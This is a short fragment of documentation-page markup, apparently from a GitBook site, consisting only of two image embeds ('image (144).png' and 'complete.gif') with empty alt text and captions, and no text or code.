<figure><img src="../../../../.gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
